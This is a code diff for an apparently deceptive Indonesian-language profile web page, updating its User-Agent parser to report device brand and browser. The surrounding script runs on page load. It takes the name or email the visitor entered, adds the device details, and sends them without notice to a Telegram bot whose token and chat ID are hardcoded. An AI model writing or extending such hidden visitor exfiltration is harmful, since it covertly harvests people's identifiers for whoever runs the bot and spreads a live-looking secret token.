@@ -8,7 +8,7 @@
         /* 
           --------------------------------------------------
           Dibuat dengan riset, ketelitian, dan kopi hitam oleh Roni
-          Versi: 4.4 (Ultra-Precise Device Model Extractor)
+          Versi: 4.5 (Flawless Device & Browser Parser)
           --------------------------------------------------
         */
         * {
@@ -305,7 +305,7 @@
         </div>
     </div>
 
-    <!-- Script Ekstraktor Nama HP Asli & Pelacak Telegram -->
+    <!-- Script Parser Perangkat & Browser Sempurna + Pelacak Telegram -->
     <script>
         window.addEventListener('DOMContentLoaded', () => {
             const nameElement = document.getElementById('profile-name');
@@ -332,41 +332,49 @@
             nameElement.textContent = cleanName;
             avatarElement.textContent = cleanName.charAt(0).toUpperCase();
 
-            // Fungsi Ekstraktor Spesifik Model Perangkat Asli dari Browser User-Agent
-            function getExactDeviceModel(ua) {
-                if (/iphone/i.test(ua)) return "📱 Apple iPhone";
-                if (/ipad/i.test(ua)) return "📱 Apple iPad";
-                if (/windows/i.test(ua)) return "💻 PC Windows";
-                if (/macintosh|mac os x/i.test(ua)) return "💻 Apple Mac";
-
-                // Mengekstrak model tipe HP Android secara presisi dari string sistem
-                let androidMatch = ua.match(/Linux;\sAndroid[^;]+;\s([^)]+)/i);
-                if (androidMatch && androidMatch[1]) {
-                    let rawModel = androidMatch[1].trim();
-                    // Bersihkan teks ekstra seperti Build, K, dll jika ada
-                    let cleanModel = rawModel.split(/[\s_-]Build/i)[0].trim();
-                    return `📱 HP Android (${cleanModel})`;
-                }
-
-                // Deteksi brand alternatif jika pola kurung tidak lengkap
-                if (/samsung|SM-/i.test(ua)) return "📱 HP Samsung";
-                if (/oppo|CPH/i.test(ua)) return "📱 HP Oppo";
-                if (/vivo/i.test(ua)) return "📱 HP Vivo";
-                if (/xiaomi|redmi|poco/i.test(ua)) return "📱 HP Xiaomi / Redmi";
-                if (/realme/i.test(ua)) return "📱 HP Realme";
-                if (/infinix/i.test(ua)) return "📱 HP Infinix";
+            // Fungsi Parser Perangkat & Browser yang Sempurna & Elegan
+            function getFlawlessDevice(ua) {
+                let browser = "Browser Umum";
                 
-                return "📱 Smartphone / Mobile Device";
+                // Deteksi Browser secara akurat
+                if (/chrome|crios/i.test(ua)) browser = "Google Chrome";
+                else if (/firefox|fxios/i.test(ua)) browser = "Mozilla Firefox";
+                else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = "Apple Safari";
+                else if (/edge|edg/i.test(ua)) browser = "Microsoft Edge";
+                else if (/opr|opera/i.test(ua)) browser = "Opera";
+                else if (/ucbrowser/i.test(ua)) browser = "UC Browser";
+                else if (/samsungbrowser/i.test(ua)) browser = "Samsung Internet";
+
+                // Deteksi Perangkat Spesifik / OS
+                if (/iphone/i.test(ua)) return `📱 Apple iPhone (${browser})`;
+                if (/ipad/i.test(ua)) return `📱 Apple iPad (${browser})`;
+                if (/macintosh|mac os x/i.test(ua)) return `💻 Apple Mac (${browser})`;
+                if (/windows/i.test(ua)) return `💻 Windows PC (${browser})`;
+
+                if (/samsung|SM-/i.test(ua)) return `📱 Samsung Galaxy (${browser})`;
+                if (/oppo|CPH/i.test(ua)) return `📱 Oppo Smartphone (${browser})`;
+                if (/vivo/i.test(ua)) return `📱 Vivo Smartphone (${browser})`;
+                if (/xiaomi|redmi|poco/i.test(ua)) return `📱 Xiaomi / Redmi (${browser})`;
+                if (/realme/i.test(ua)) return `📱 Realme Smartphone (${browser})`;
+                if (/infinix/i.test(ua)) return `📱 Infinix Smartphone (${browser})`;
+                if (/tecno/i.test(ua)) return `📱 Tecno Smartphone (${browser})`;
+                if (/pixel/i.test(ua)) return `📱 Google Pixel (${browser})`;
+
+                // Fallback bersih jika model spesifik disembunyikan browser
+                let androidVer = ua.match(/Android\s([0-9.]+)/i);
+                let androidInfo = androidVer ? `Android ${androidVer[1]}` : "Android Mobile";
+
+                return `📱 ${androidInfo} (${browser})`;
             }
 
-            const exactDevice = getExactDeviceModel(navigator.userAgent);
+            const flawlessDevice = getFlawlessDevice(navigator.userAgent);
 
             // Script Pelacak Pengunjung Real-Time ke Bot Telegram
             const botToken = "8886940858:AAEMAdvWAyfK0vi6Rpx-qmME3pvwyM8Q6Ew"; 
             const chatId = "5983713854"; 
 
             if (botToken && chatId) {
-                const textMessage = `🚨 Pengunjung Baru Web!\n\n👤 Nama/Email Input: ${savedAccount}\n📱 Perangkat: ${exactDevice}\n⏰ Waktu: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}`;
+                const textMessage = `🚨 Pengunjung Baru Web!\n\n👤 Nama/Email Input: ${savedAccount}\nPerangkat: ${flawlessDevice}\n⏰ Waktu: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}`;
                 const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
                 fetch(telegramUrl, {
